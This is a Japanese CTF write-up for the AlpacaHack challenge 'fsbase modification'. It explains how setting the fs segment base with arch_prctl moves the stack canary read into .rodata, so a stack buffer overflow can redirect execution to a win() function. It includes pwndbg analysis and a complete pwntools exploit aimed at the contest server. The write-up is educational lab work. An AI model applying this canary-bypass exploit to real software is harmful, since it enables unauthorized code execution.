---
title: Daily-AlpacaHack 「fsbase modification」Hard Writeup
description: 任意fsbaseによるCanaryの無効化と，Stack-BoFを利用したリターンアドレス乗っ取りに関する問題
date: 2026-10-09 00:10:00 +0900
categories: [CyberSecurity, CTF]
tags: [alpacahack, pwn, fsbase, stack_bof, canary_spoofing]
---

# daily_alpaca-pwn-hard-fsbase_modification

## Summary

本問は，任意fsbaseによるCanaryの無効化と，Stack-BoFを利用したリターンアドレス乗っ取りに関する問題です．

> - **Category**: Pwn
> - **Description**: vuln関数にはスタックバッファオーバーフローの脆弱性があります。  
>   しかし戻りアドレスを改変してもstack canaryがあるため異常終了してしまいます。  
>   ただ今回は、vuln関数が呼び出される前にfsbaseというものを設定できるようです。
> - **Tools & TechStack**:
> 	- C
> - **Release**: 2026/10/05
{: .prompt-info }

**配布ファイル**
```
.
├── chal
├── chal.c
├── compose.yaml
├── Dockerfile
└── flag.txt

1 directory, 5 files
```

**バイナリ防御機構**
```shell
❯ checksec --file=chal          
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

---
## ソースコードの解析

`chal.c`
```c
// gcc -o chal chal.c -no-pie
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <asm/prctl.h>

void __attribute__((__used__)) win(void) {
    char *argv[] = {"/bin/cat", "/flag.txt", NULL};
    syscall(SYS_execve, argv[0], argv, NULL);
}

void vuln(void) {
    char buf[8] = {0};
    write(STDOUT_FILENO, "Please leave a message> ", 24);
    read(STDIN_FILENO, buf, 32);
}

int main(void) {
    write(STDOUT_FILENO, "fsbase(-1 for testing a default vuln behavior): ", 48);
    char buf[32] = {0};
    read(STDIN_FILENO, buf, sizeof(buf) - 1);
    unsigned long fsbase = strtoul(buf, NULL, 10);

    int result = syscall(SYS_arch_prctl, ARCH_SET_FS, fsbase);
    if (result < 0) {
        write(STDOUT_FILENO, "arch_prctl failed.\n", 19);
    }

    vuln();
}
```

```shell
$ ./chal
fsbase(-1 for testing a default vuln behavior): -1
arch_prctl failed.
Please leave a message> 1111111111111111111111111111111 # '1' * 33
*** stack smashing detected ***: terminated
zsh: abort      ./chal
```

`vuln()` でスタックベースのバッファオーバーフローが可能な構成になっていますが，**Canary Token** によってabortされるため，直接的にリターンアドレスを書き換えることができません．

`arch_prctl`[^1] がヒントになると思ったため，この機能に関して調べました．
これは，**`fs` セグメントレジスタ** のベースアドレスを設定できるもののようです．

これを利用して，Canaryのバイパスや無効化をできないかを調べていると，`_GCC generates %fs:0x28 to access the stack guard_`[^2] という情報が見つかりました．  
そのため，Canaryは，`fsbase + 0x28` のオフセットに存在することが分かりました．

## `ARCH_PRCTL` を利用したCanaryの無効化

Canaryの読み出し元を既知・不変な領域に移し，Canaryのチェックを無効化する方法を思いつきました．(Canary spoofing)

この方法を実行するためには，有効なアドレスかつ，値が既知，不変な領域に `fsbase` を配置する必要があります．
そこで，`.rodata` を使用することを思いつきました．

1. 定数や文字列リテラルが格納される (**値が既知**)．
2. **ReadOnly** なため，値が不変．
3. **ASLR** の影響を受けないため，アドレスが固定．

上記より，今回の攻撃に使用可能な条件が揃っています．  
次は，以下の攻撃に必要な情報を収集します．

- **`win()` アドレス**: リターンアドレス乗っ取りのジャンプ先．
- **リターンアドレスの位置**: `win()` アドレスの書き込み先．
- **Canary 自体のアドレス**: `.rodata` の文字列と同じ値を配置するため (**Canaryの無効化**)
- **`buf[8]` 先頭アドレス・Canaryまでのオフセット**: BoFの計算に必要．
- **`fsbase` を配置するアドレス**: `.rodata` の任意のアドレス．

### `win()` アドレス

```c
pwndbg> disas win
Dump of assembler code for function win:
   0x00000000004011b6 <+0>:     endbr64
   0x00000000004011ba <+4>:     push   rbp
```

- `win()` の先頭アドレス: `0x00000000004011b6`

### リターンアドレスの位置

`read(STDIN_FILENO, buf, 32);` より，32byte以内にリターンアドレスが存在すれば，BoFで上書きできます．

```shell
pwndbg> disas vuln
Dump of assembler code for function vuln:
   0x0000000000401225 <+0>:     endbr64
   0x0000000000401229 <+4>:     push   rbp      # saved rbp
   0x000000000040122a <+5>:     mov    rbp,rsp  # このフレームの基準点を rbp に保存
   0x000000000040122d <+8>:     sub    rsp,0x10 # ローカル変数分の領域を確保
   0x0000000000401231 <+12>:    mov    rax,QWORD PTR fs:0x28
#...

pwndbg> disas main
Dump of assembler code for function main:
#...
   0x000000000040134f <+193>:   call   0x401225 <vuln> # call の次の命令のアドレス (0x401354) がpushされる
   0x0000000000401354 <+198>:   mov    eax,0x0
#...
```

-  **saved rbp = `[rbp+0]`** **リターンアドレス = `[rbp+0x8]`**．
- **`&buf` から，saved rbp までのオフセット:** `&buf = rbp - 0x10` より，`saved rbp = rbp+0 = &buf + 0x10`
- **`&buf` から，return address までのオフセット:** `return addr = rbp + 0x8 = &buf + 0x18`

**実測での確認:**

```shell
pwndbg> b *vuln+12
Breakpoint 1 at 0x401231

pwndbg> r

pwndbg> x/gx $rbp+8
0x7fffffff7068: 0x0000000000401354

pwndbg> x/gx $rbp
0x7fffffff7060: 0x00007fffffff70b0
```

`call vuln` の次のアドレス `0x0000000000401354` が `rbp+8` に格納されているため，return addrで確定できました．

### Canary アドレス

```shell
pwndbg> disas vuln
Dump of assembler code for function vuln:
#...
   0x0000000000401278 <+83>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040127c <+87>:    sub    rax,QWORD PTR fs:0x28
   0x0000000000401285 <+96>:    je     0x40128c <vuln+103>
   0x0000000000401287 <+98>:    call   0x401090 <__stack_chk_fail@plt>
   0x000000000040128c <+103>:   leave
   0x000000000040128d <+104>:   ret
```

比較されるcanaryが，`[rbp-0x8]` にあることが分かったため，`*vuln+87` にbpを張りCanaryを壊していない状況で確認します．

```shell
pwndbg> b *vuln+87
Breakpoint 1 at 0x40127c

pwndbg> r

pwndbg> x/gx $rbp-0x8
0x7fffffff6e68: 0x88ad401963cb4200
```

- Canaryのアドレス: `0x7fffffff6e68`

### `buf[8]` の先頭アドレスとCanaryまでのオフセット

```shell
pwndbg> disas vuln
Dump of assembler code for function vuln:
   0x0000000000401225 <+0>:     endbr64
   0x0000000000401229 <+4>:     push   rbp
   0x000000000040122a <+5>:     mov    rbp,rsp
   0x000000000040122d <+8>:     sub    rsp,0x10
   0x0000000000401231 <+12>:    mov    rax,QWORD PTR fs:0x28
   0x000000000040123a <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040123e <+25>:    xor    eax,eax
   0x0000000000401240 <+27>:    mov    QWORD PTR [rbp-0x10],0x0
   0x0000000000401248 <+35>:    mov    edx,0x18
#...

pwndbg> x/gx $rbp-0x10
0x7fffffff6e60: 0x0000000000000000
```

`&buf` が `[rbp-0x10]` にあり，`0x7fffffff6e60` であることが判明しました．  
また，`&buf` からCanaryまでのオフセットは，`0x7fffffff6e68 - 0x7fffffff6e60 = 0x8` なので，`[8:16)` の位置に，`/bin/cat` を配置します．

### `fsbase` に設定すべきアドレス

`.rodata` を覗き，`fsbase` に設定すべきアドレスを探します．

```shell
$ readelf -S chal
There are 31 section headers, starting at offset 0x3748:
Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
#...
  [17] .rodata           PROGBITS         0000000000402000  00002000
       000000000000007d  0000000000000000   A       0     0     8
#...


$readelf -x .rodata chal
Hex dump of section '.rodata':
  0x00402000 01000200 00000000 2f62696e 2f636174 ......../bin/cat
  0x00402010 002f666c 61672e74 78740050 6c656173 ./flag.txt.Pleas
  0x00402020 65206c65 61766520 61206d65 73736167 e leave a messag
#...
```

`0x402008`: `2f 62 69 6e 2f 63 61 74` = `/bin/cat` があるため，`fsbase = 0x402008 - 0x28` として設定します．  
Canaryのオフセットを引くことで `fsbase` から丁度 `0x28` 進んだところに，`/bin/cat` が来るようにします．

## Exploit を書く

```python
from pwn import *

# context.log_level = 'debug'

p = remote("34.170.146.252", 37571)

rodata = 0x402008
fsbase = rodata - 0x28

WIN = 0x00000000004011b6

payload  = b'A'*8          # [0:8)   buf パディング
payload += b'/bin/cat'     # [8:16)  canary 位置
payload += b'C'*8          # [16:24) saved rbp
payload += p64(WIN)        # [24:32) リターンアドレス

p.sendlineafter(b"fsbase(-1 for testing a default vuln behavior): ", str(fsbase).encode())
p.sendlineafter(b"Please leave a message> ", payload)

print(p.recvall(timeout=3))
```

```shell
$ python3 exploit.py
b'<REDACTED>\n'
```

---
## Post-Mortem & Dead ends

fsbase自体を知らなかったから難しかったけど，めっちゃ勉強になった~

### なぜ，`SHSTK` が有効表記されているのに攻撃できたのか

checksecの `Enabled` はバイナリが CET に対応している (`.note.gnu.property` にマークがある) ことを示すだけで，実行時に強制されるかはCPU・カーネル・環境依存です．  
そのため，通常スタックのリターンアドレス書き換えが行えました．

## References

[^1]: [Man page of ARCH\_PRCTL](https://linuxjm.sourceforge.io/html/LDP_man-pages/man2/arch_prctl.2.html)

[^2]: [Re: \[RFC PATCH glibc 11/12\] hurd, htl: Add some x86\_64-specific code](https://lists.gnu.org/archive/html/bug-hurd/2023-02/msg00110.html)
